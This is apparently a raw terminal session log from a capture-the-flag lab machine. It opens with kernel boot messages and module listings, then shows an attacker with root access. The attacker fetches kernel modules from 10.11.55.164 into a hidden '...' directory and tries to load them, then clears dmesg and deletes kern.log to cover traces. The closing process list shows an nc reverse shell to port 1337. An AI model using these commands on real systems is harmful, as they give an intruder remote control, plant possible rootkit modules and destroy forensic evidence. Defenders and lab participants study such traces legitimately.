[    2.426717] x86/mm: Checking user space page tables
[    2.436754] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.463810] random: systemd-udevd: uninitialized urandom read (16 bytes read)
[    2.474558] random: udevadm: uninitialized urandom read (16 bytes read)
[    2.483545] random: systemd-udevd: uninitialized urandom read (16 bytes read)
[    2.656042] tsc: Refined TSC clocksource calibration: 2300.025 MHz
[    2.661332] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x21274d0437c, max_idle_ns: 440795302444 ns
[    2.675444] FDC 0 is a S82078B
[    2.831462] checking generic (f0000000 160000) vs hw (f0000000 2000000)
[    2.831463] fb: switching to cirrusdrmfb from EFI VGA
[    2.845470] AVX2 version of gcm_enc/dec engaged.
[    2.848855] AES CTR mode by8 optimization enabled
[    2.866839] Console: switching to colour dummy device 80x25
[    2.900478] [TTM] Zone  kernel: Available graphics memory: 503412 kiB
[    2.913109] [TTM] Initializing pool allocator
[    2.918419] [TTM] Initializing DMA pool allocator
[    2.925916] [drm] fb mappable at 0xF0000000
[    2.931828] [drm] vram aper at 0xF0000000
[    2.937771] [drm] size 33554432
[    2.942019] [drm] fb depth is 24
[    2.946375] [drm]    pitch is 3072
[    2.951292] fbcon: cirrusdrmfb (fb0) is primary device
[    3.013412] Console: switching to colour frame buffer device 128x48
[    3.032068] cirrus 0000:00:02.0: fb0: cirrusdrmfb frame buffer device
[    3.039164] [drm] Initialized cirrus 1.0.0 20110418 for 0000:00:02.0 on minor 0
[    3.047901] piix4_smbus 0000:00:01.3: SMBus base address uninitialized - upgrade BIOS or use force_addr=0xaddr
[    3.268015] raid6: sse2x1   gen()  5852 MB/s
[    3.323145] raid6: sse2x1   xor()  5021 MB/s
[    3.383252] raid6: sse2x2   gen()  8887 MB/s
[    3.432013] raid6: sse2x2   xor()  5586 MB/s
[    3.480059] raid6: sse2x4   gen()  8241 MB/s
[    3.528064] raid6: sse2x4   xor()  6600 MB/s
[    3.576023] raid6: avx2x1   gen() 11304 MB/s
[    3.624030] raid6: avx2x1   xor()  9634 MB/s
[    3.672013] raid6: avx2x2   gen() 13403 MB/s
[    3.724051] raid6: avx2x2   xor()  9898 MB/s
[    3.780169] raid6: avx2x4   gen() 17487 MB/s
[    3.832010] raid6: avx2x4   xor() 11947 MB/s
[    3.835297] raid6: using algorithm avx2x4 gen() 17487 MB/s
[    3.840063] raid6: .... xor() 11947 MB/s, rmw enabled
[    3.848186] raid6: using avx2x2 recovery algorithm
[    3.854477] xor: automatically using best checksumming function   avx       
[    3.863374] async_tx: api initialized (async)
[    3.940742] Btrfs loaded, crc32c=crc32c-intel
[    4.000335] EXT4-fs (xvda2): mounted filesystem with ordered data mode. Opts: (null)
[    4.262336] ip_tables: (C) 2000-2006 Netfilter Core Team
[    4.275730] systemd[1]: systemd 237 running in system mode. (+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD -IDN2 +IDN -PCRE2 default-hierarchy=hybrid)
[    4.295857] systemd[1]: Detected virtualization xen.
[    4.300149] systemd[1]: Detected architecture x86-64.
[    4.313894] systemd[1]: Set hostname to <foodctf>.
[    4.513732] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input4
[    4.590139] systemd[1]: Created slice User and Session Slice.
[    4.602074] systemd[1]: Reached target Swap.
[    4.609949] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    4.621299] systemd[1]: Reached target User and Group Name Lookups.
[    4.630935] systemd[1]: Set up automount Arbitrary Executable File Formats File System Automount Point.
[    4.645702] systemd[1]: Created slice System Slice.
[    4.716040] EXT4-fs (xvda2): re-mounted. Opts: (null)
[    4.878415] Loading iSCSI transport class v2.0-870.
[    4.918480] iscsi: registered transport (tcp)
[    5.031984] iscsi: registered transport (iser)
[    5.251997] systemd-journald[397]: Received request to flush runtime journal from PID 1
[    5.645259] audit: type=1400 audit(1702074699.788:2): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default" pid=491 comm="apparmor_parser"
[    5.645262] audit: type=1400 audit(1702074699.788:3): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-cgns" pid=491 comm="apparmor_parser"
[    5.645263] audit: type=1400 audit(1702074699.788:4): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-with-mounting" pid=491 comm="apparmor_parser"
[    5.645265] audit: type=1400 audit(1702074699.788:5): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-with-nesting" pid=491 comm="apparmor_parser"
[    5.677599] audit: type=1400 audit(1702074699.820:6): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/sbin/dhclient" pid=494 comm="apparmor_parser"
[    5.677602] audit: type=1400 audit(1702074699.820:7): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-client.action" pid=494 comm="apparmor_parser"
[    5.677604] audit: type=1400 audit(1702074699.820:8): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-helper" pid=494 comm="apparmor_parser"
[    5.677605] audit: type=1400 audit(1702074699.820:9): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=494 comm="apparmor_parser"
[    5.687048] audit: type=1400 audit(1702074699.828:10): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/bin/lxc-start" pid=496 comm="apparmor_parser"
[    5.696891] audit: type=1400 audit(1702074699.840:11): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/bin/man" pid=497 comm="apparmor_parser"
[    6.561948] RAPL PMU: API unit is 2^-32 Joules, 3 fixed counters, 655360 ms ovfl timer
[    6.561949] RAPL PMU: hw unit of domain pp0-core 2^-14 Joules
[    6.561950] RAPL PMU: hw unit of domain package 2^-14 Joules
[    6.561950] RAPL PMU: hw unit of domain dram 2^-16 Joules
[    6.599251] EDAC sbridge: Seeking for: PCI ID 8086:6fa0
[    6.599255] EDAC sbridge:  Ver: 1.1.2 
[   20.098694] new mount options do not match the existing superblock, will be ignored
[   23.305090] random: crng init done
[   23.305092] random: 7 urandom warning(s) missed due to ratelimiting
lsmod
Module                  Size  Used by
binfmt_misc            20480  1
sb_edac                24576  0
intel_rapl_perf        16384  0
input_leds             16384  0
serio_raw              16384  0
mac_hid                16384  0
sch_fq_codel           20480  2
ib_iser                49152  0
rdma_cm                61440  1 ib_iser
iw_cm                  45056  1 rdma_cm
ib_cm                  53248  1 rdma_cm
ib_core               221184  4 rdma_cm,iw_cm,ib_iser,ib_cm
iscsi_tcp              20480  0
libiscsi_tcp           20480  1 iscsi_tcp
libiscsi               53248  3 libiscsi_tcp,iscsi_tcp,ib_iser
scsi_transport_iscsi    98304  3 iscsi_tcp,ib_iser,libiscsi
ip_tables              28672  0
x_tables               40960  1 ip_tables
autofs4                40960  2
btrfs                1138688  0
zstd_compress         163840  1 btrfs
raid10                 53248  0
raid456               147456  0
async_raid6_recov      20480  1 raid456
async_memcpy           16384  2 raid456,async_raid6_recov
async_pq               16384  2 raid456,async_raid6_recov
async_xor              16384  3 async_pq,raid456,async_raid6_recov
async_tx               16384  5 async_pq,async_memcpy,async_xor,raid456,async_raid6_recov
xor                    24576  2 async_xor,btrfs
raid6_pq              114688  4 async_pq,btrfs,raid456,async_raid6_recov
libcrc32c              16384  1 raid456
raid1                  40960  0
raid0                  20480  0
multipath              16384  0
linear                 16384  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
pcbc                   16384  0
i2c_piix4              24576  0
cirrus                 24576  1
aesni_intel           188416  0
aes_x86_64             20480  1 aesni_intel
crypto_simd            16384  1 aesni_intel
ttm                   106496  1 cirrus
glue_helper            16384  1 aesni_intel
cryptd                 24576  3 crypto_simd,ghash_clmulni_intel,aesni_intel
drm_kms_helper        172032  1 cirrus
syscopyarea            16384  1 drm_kms_helper
sysfillrect            16384  1 drm_kms_helper
sysimgblt              16384  1 drm_kms_helper
psmouse               151552  0
fb_sys_fops            16384  1 drm_kms_helper
drm                   401408  4 drm_kms_helper,cirrus,ttm
pata_acpi              16384  0
floppy                 77824  0
hey there buddy :)
cd /var && mkdir ... && cd ... && wget 10.11.55.164/food.ko && wget 10.11.55.164/foodmount.ko && insmod food.ko && insmod foodmount.ko && rm * && dmesg --clear
--2023-12-08 23:01:42--  http://10.11.55.164/food.ko
Connecting to 10.11.55.164:80... 
connected.
HTTP request sent, awaiting response... 200 OK
Length: 7240 (7.1K) [application/octet-stream]
Saving to: 'food.ko'

     0K .......                                               100%  102M=0s

2023-12-08 23:01:43 (102 MB/s) - 'food.ko' saved [7240/7240]

--2023-12-08 23:01:43--  http://10.11.55.164/foodmount.ko
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944 (5.8K) [application/octet-stream]
Saving to: 'foodmount.ko'

     0K .....                                                 100% 3.52M=0.002s

2023-12-08 23:01:43 (3.52 MB/s) - 'foodmount.ko' saved [5944/5944]

insmod: ERROR: could not insert module food.ko: Operation not permitted

ls -la
total 24
drwxr-xr-x  2 root root 4096 Dec  8 23:01 .
drwxr-xr-x 14 root root 4096 Dec  8 23:01 ..
-rw-r--r--  1 root root 7240 Jun 12 15:25 food.ko
-rw-r--r--  1 root root 5944 Jun 12 15:57 foodmount.ko
cd ..
rm -rf ...
w
 23:01:47 up 30 min,  0 users,  load average: 0.36, 0.94, 1.47
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
pwd
/var
ls -la
total 56
drwxr-xr-x 13 root root   4096 Dec  8 23:01 .
drwxr-xr-x 24 root root   4096 Mar 19  2020 ..
drwxr-xr-x  2 root root   4096 Mar 20  2020 backups
drwxr-xr-x 10 root root   4096 Mar 19  2020 cache
drwxrwxrwt  2 root root   4096 Aug  5  2019 crash
-rw-r--r--  1 root root     38 Mar 28  2020 flag.txt
drwxr-xr-x 41 root root   4096 Mar 20  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Aug  5  2019 lock -> /run/lock
drwxrwxr-x 10 root syslog 4096 Mar 30  2020 log
drwxrwsr-x  2 root mail   4096 Aug  5  2019 mail
drwxr-xr-x  2 root root   4096 Aug  5  2019 opt
lrwxrwxrwx  1 root root      4 Aug  5  2019 run -> /run
drwxr-xr-x  3 root root   4096 Mar 19  2020 snap
drwxr-xr-x  4 root root   4096 Aug  5  2019 spool
drwxrwxrwt  5 root root   4096 Dec  8 23:00 tmp
cd
dmesg --clear
cd /sys/kernel/tracing
ls -la
total 0
dr-xr-xr-x  2 root root 0 Dec  8 22:31 .
drwxr-xr-x 13 root root 0 Dec  8 22:31 ..
cd ..
cd debug
ls -la
total 0
drwx------ 29 root root 0 Dec  8 22:31 .
drwxr-xr-x 13 root root 0 Dec  8 22:31 ..
drwxr-xr-x  2 root root 0 Dec  8 22:31 acpi
drwxr-xr-x 13 root root 0 Dec  8 22:31 bdi
drwxr-xr-x 12 root root 0 Dec  8 22:31 block
drwxr-xr-x  2 root root 0 Dec  8 22:31 btrfs
drwxr-xr-x  2 root root 0 Dec  8 22:31 cleancache
--w-------  1 root root 0 Dec  8 22:31 clear_warn_once
drwxr-xr-x  2 root root 0 Dec  8 22:31 clk
drwxr-xr-x  2 root root 0 Dec  8 22:31 dma_buf
drwxr-xr-x  3 root root 0 Dec  8 22:31 dri
drwxr-xr-x  2 root root 0 Dec  8 22:31 dynamic_debug
drwxr-xr-x  2 root root 0 Dec  8 22:31 extfrag
-rw-r--r--  1 root root 0 Dec  8 22:31 fault_around_bytes
drwxr-xr-x  2 root root 0 Dec  8 22:31 frontswap
-r--r--r--  1 root root 0 Dec  8 22:31 gpio
drwxr-xr-x  2 root root 0 Dec  8 22:31 iosf_sb
drwxr-xr-x  2 root root 0 Dec  8 22:31 kprobes
drwxr-xr-x  2 root root 0 Dec  8 22:31 mce
drwxr-xr-x  2 root root 0 Dec  8 22:31 opp
drwxr-xr-x  2 root root 0 Dec  8 22:31 pinctrl
drwxr-xr-x  2 root root 0 Dec  8 22:31 pm_genpd
drwxr-xr-x  2 root root 0 Dec  8 22:31 pm_qos
-r--r--r--  1 root root 0 Dec  8 22:31 pwm
drwxr-xr-x  3 root root 0 Dec  8 22:31 ras
drwxr-xr-x  2 root root 0 Dec  8 22:31 regmap
drwxr-xr-x  3 root root 0 Dec  8 22:31 regulator
-rw-r--r--  1 root root 0 Dec  8 22:31 sched_debug
-rw-r--r--  1 root root 0 Dec  8 22:31 sched_features
-r--r--r--  1 root root 0 Dec  8 22:31 sleep_time
--w-------  1 root root 0 Dec  8 22:31 split_huge_pages
-r--r--r--  1 root root 0 Dec  8 22:31 suspend_stats
drwxr-xr-x  2 root root 0 Dec  8 22:31 sync
drwx------  8 root root 0 Dec  8 22:31 tracing
drwxr-xr-x  6 root root 0 Dec  8 22:31 usb
drwxr-xr-x  2 root root 0 Dec  8 22:31 virtio-ports
-r--r--r--  1 root root 0 Dec  8 22:31 wakeup_sources
drwxr-xr-x  2 root root 0 Dec  8 22:31 x86
drwxr-xr-x  2 root root 0 Dec  8 22:31 zswap
cd tracing
ls -la
total 0
drwx------  8 root root 0 Dec  8 22:31 .
drwx------ 29 root root 0 Dec  8 22:31 ..
-r--r--r--  1 root root 0 Dec  8 22:31 README
-r--r--r--  1 root root 0 Dec  8 22:31 available_events
-r--r--r--  1 root root 0 Dec  8 22:31 available_filter_functions
-r--r--r--  1 root root 0 Dec  8 22:31 available_tracers
-rw-r--r--  1 root root 0 Dec  8 22:31 buffer_size_kb
-r--r--r--  1 root root 0 Dec  8 22:31 buffer_total_size_kb
-rw-r--r--  1 root root 0 Dec  8 22:31 current_tracer
-r--r--r--  1 root root 0 Dec  8 22:31 dyn_ftrace_total_info
-r--r--r--  1 root root 0 Dec  8 22:31 enabled_functions
drwxr-xr-x 84 root root 0 Dec  8 22:31 events
--w-------  1 root root 0 Dec  8 22:31 free_buffer
-rw-r--r--  1 root root 0 Dec  8 22:31 function_profile_enabled
drwxr-xr-x  2 root root 0 Dec  8 22:31 hwlat_detector
drwxr-xr-x  2 root root 0 Dec  8 22:31 instances
-rw-r--r--  1 root root 0 Dec  8 22:31 kprobe_events
-r--r--r--  1 root root 0 Dec  8 22:31 kprobe_profile
-rw-r--r--  1 root root 0 Dec  8 22:31 max_graph_depth
drwxr-xr-x  2 root root 0 Dec  8 22:31 options
drwxr-xr-x 17 root root 0 Dec  8 22:31 per_cpu
-r--r--r--  1 root root 0 Dec  8 22:31 printk_formats
-r--r--r--  1 root root 0 Dec  8 22:31 saved_cmdlines
-rw-r--r--  1 root root 0 Dec  8 22:31 saved_cmdlines_size
-r--r--r--  1 root root 0 Dec  8 22:31 saved_tgids
-rw-r--r--  1 root root 0 Dec  8 22:31 set_event
-rw-r--r--  1 root root 0 Dec  8 22:31 set_event_pid
-rw-r--r--  1 root root 0 Dec  8 22:31 set_ftrace_filter
-rw-r--r--  1 root root 0 Dec  8 22:31 set_ftrace_notrace
-rw-r--r--  1 root root 0 Dec  8 22:31 set_ftrace_pid
-r--r--r--  1 root root 0 Dec  8 22:31 set_graph_function
-r--r--r--  1 root root 0 Dec  8 22:31 set_graph_notrace
-rw-r--r--  1 root root 0 Dec  8 22:31 snapshot
-rw-r--r--  1 root root 0 Dec  8 22:31 stack_max_size
-r--r--r--  1 root root 0 Dec  8 22:31 stack_trace
-r--r--r--  1 root root 0 Dec  8 22:31 stack_trace_filter
-rw-r--r--  1 root root 0 Dec  8 22:31 trace
-rw-r--r--  1 root root 0 Dec  8 22:31 trace_clock
--w--w----  1 root root 0 Dec  8 22:31 trace_marker
--w--w----  1 root root 0 Dec  8 22:31 trace_marker_raw
-rw-r--r--  1 root root 0 Dec  8 22:31 trace_options
-r--r--r--  1 root root 0 Dec  8 22:31 trace_pipe
drwxr-xr-x  2 root root 0 Dec  8 22:31 trace_stat
-rw-r--r--  1 root root 0 Dec  8 22:31 tracing_cpumask
-rw-r--r--  1 root root 0 Dec  8 22:31 tracing_max_latency
-rw-r--r--  1 root root 0 Dec  8 22:31 tracing_on
-rw-r--r--  1 root root 0 Dec  8 22:31 tracing_thresh
-rw-r--r--  1 root root 0 Dec  8 22:31 uprobe_events
-r--r--r--  1 root root 0 Dec  8 22:31 uprobe_profile
cat available_filter_functions |grep hacked
cat available_filter_functions |grep hook
cpufreq_remove_update_util_hook
cpufreq_add_update_util_hook
intel_pstate_clear_update_util_hook
allocate_hook_entries_size
hooks_validate
__nf_hook_entries_try_shrink
nf_hook_slow
nf_hook_entry_head.isra.4.part.5
nf_register_net_hook
__nf_unregister_net_hook
nf_unregister_net_hook
nf_unregister_net_hooks
nf_register_net_hooks
nf_queue_nf_hook_drop
__unregister_prot_hook
__register_prot_hook.part.54
btree_io_failed_hook [btrfs]
btree_readpage_end_io_hook [btrfs]
btree_submit_bio_hook [btrfs]
btrfs_readpage_io_failed_hook [btrfs]
btrfs_writepage_start_hook [btrfs]
btrfs_writepage_end_io_hook [btrfs]
btrfs_submit_bio_hook [btrfs]
btrfs_readpage_end_io_hook [btrfs]
btrfs_merge_bio_hook [btrfs]
btrfs_split_extent_hook [btrfs]
btrfs_merge_extent_hook [btrfs]
btrfs_set_bit_hook [btrfs]
btrfs_clear_bit_hook [btrfs]
__readahead_hook [btrfs]
btree_readahead_hook [btrfs]
xt_hook_ops_alloc [x_tables]
textify_hooks.constprop.16 [x_tables]

lsmod
Module                  Size  Used by
binfmt_misc            20480  1
sb_edac                24576  0
intel_rapl_perf        16384  0
input_leds             16384  0
serio_raw              16384  0
mac_hid                16384  0
sch_fq_codel           20480  2
ib_iser                49152  0
rdma_cm                61440  1 ib_iser
iw_cm                  45056  1 rdma_cm
ib_cm                  53248  1 rdma_cm
ib_core               221184  4 rdma_cm,iw_cm,ib_iser,ib_cm
iscsi_tcp              20480  0
libiscsi_tcp           20480  1 iscsi_tcp
libiscsi               53248  3 libiscsi_tcp,iscsi_tcp,ib_iser
scsi_transport_iscsi    98304  3 iscsi_tcp,ib_iser,libiscsi
ip_tables              28672  0
x_tables               40960  1 ip_tables
autofs4                40960  2
btrfs                1138688  0
zstd_compress         163840  1 btrfs
raid10                 53248  0
raid456               147456  0
async_raid6_recov      20480  1 raid456
async_memcpy           16384  2 raid456,async_raid6_recov
async_pq               16384  2 raid456,async_raid6_recov
async_xor              16384  3 async_pq,raid456,async_raid6_recov
async_tx               16384  5 async_pq,async_memcpy,async_xor,raid456,async_raid6_recov
xor                    24576  2 async_xor,btrfs
raid6_pq              114688  4 async_pq,btrfs,raid456,async_raid6_recov
libcrc32c              16384  1 raid456
raid1                  40960  0
raid0                  20480  0
multipath              16384  0
linear                 16384  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
pcbc                   16384  0
i2c_piix4              24576  0
cirrus                 24576  1
aesni_intel           188416  0
aes_x86_64             20480  1 aesni_intel
crypto_simd            16384  1 aesni_intel
ttm                   106496  1 cirrus
glue_helper            16384  1 aesni_intel
cryptd                 24576  3 crypto_simd,ghash_clmulni_intel,aesni_intel
drm_kms_helper        172032  1 cirrus
syscopyarea            16384  1 drm_kms_helper
sysfillrect            16384  1 drm_kms_helper
sysimgblt              16384  1 drm_kms_helper
psmouse               151552  0
fb_sys_fops            16384  1 drm_kms_helper
drm                   401408  4 drm_kms_helper,cirrus,ttm
pata_acpi              16384  0
floppy                 77824  0
cd /var/log
rm dmesg
rm: cannot remove 'dmesg': No such file or directory

ls -la
total 6296
drwxrwxr-x  10 root      syslog             4096 Mar 30  2020 .
drwxr-xr-x  13 root      root               4096 Dec  8 23:01 ..
-rw-r--r--   1 root      root              26012 Mar 20  2020 alternatives.log
-rw-r-----   1 root      adm                 333 Mar 20  2020 apport.log
drwxr-xr-x   2 root      root               4096 Mar 28  2020 apt
-rw-r-----   1 syslog    adm                  38 Mar 28  2020 auth.log
-rw-r--r--   1 root      root              56751 Aug  5  2019 bootstrap.log
-rw-rw----   1 root      utmp               3456 Mar 21  2020 btmp
-rw-r--r--   1 root      root              49915 Dec  8 22:32 cloud-init-output.log
-rw-r--r--   1 syslog    adm             1094359 Dec  8 22:32 cloud-init.log
drwxr-xr-x   2 root      root               4096 Jun 19  2019 dist-upgrade
-rw-r--r--   1 root      root                  1 Mar 28  2020 dpkg.log
-rw-r--r--   1 root      root              32192 Dec  8 23:00 faillog
drwxr-xr-x   3 root      root               4096 Mar 19  2020 installer
drwxr-sr-x+  3 root      systemd-journal    4096 Mar 19  2020 journal
-rw-r-----   1 syslog    adm             2099414 Dec  8 22:31 kern.log
drwxr-xr-x   2 landscape landscape          4096 Mar 19  2020 landscape
-rw-rw-r--   1 root      utmp             293752 Dec  8 23:00 lastlog
drwxr-xr-x   2 root      root               4096 Nov 23  2018 lxd
drwxr-x---   2 mysql     adm                4096 Mar 19  2020 mysql
-rw-r-----   1 syslog    adm             2766109 Dec  8 23:02 syslog
-rw-------   1 root      root              64384 Dec  8 23:00 tallylog
drwxr-x---   2 root      adm                4096 Mar 19  2020 unattended-upgrades
-rw-------   1 root      root                685 Mar 30  2020 vmware-network.1.log
-rw-------   1 root      root                685 Mar 27  2020 vmware-network.2.log
-rw-------   1 root      root                705 Mar 21  2020 vmware-network.3.log
-rw-------   1 root      root                685 Mar 20  2020 vmware-network.4.log
-rw-------   1 root      root                705 Mar 20  2020 vmware-network.5.log
-rw-------   1 root      root                685 Mar 20  2020 vmware-network.6.log
-rw-------   1 root      root                705 Mar 20  2020 vmware-network.7.log
-rw-------   1 root      root                685 Mar 19  2020 vmware-network.8.log
-rw-------   1 root      root                705 Mar 30  2020 vmware-network.log
-rw-------   1 root      root              66981 Mar 28  2020 vmware-vmsvc-root.1.log
-rw-------   1 root      root               4069 Mar 27  2020 vmware-vmsvc-root.2.log
-rw-------   1 root      root              22034 Mar 21  2020 vmware-vmsvc-root.3.log
-rw-------   1 root      root               2784 Mar 30  2020 vmware-vmsvc-root.log
-rw-------   1 root      root               1702 Mar 20  2020 vmware-vmsvc.1.log
-rw-------   1 root      root               1702 Mar 20  2020 vmware-vmsvc.2.log
-rw-------   1 root      root               2084 Mar 20  2020 vmware-vmsvc.3.log
-rw-------   1 root      root               1702 Mar 20  2020 vmware-vmsvc.log
-rw-------   1 root      root               1218 Mar 30  2020 vmware-vmtoolsd-root.log
-rw-rw-r--   1 root      utmp              73728 Dec  8 22:55 wtmp
rm kern.log
w
 23:02:59 up 31 min,  0 users,  load average: 0.19, 0.77, 1.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       255  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:3]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1589  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:3]
root      1590  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:4]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root         1  0.3  0.8 159864  9012 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.6 127672 17056 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.0  0.4  45560  4512 ?        Ss   22:31   0:01 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3400 ?        S    23:00   0:00      |   \_ -i
root      2915  0.0  0.3  37080  3344 ?        R    23:03   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
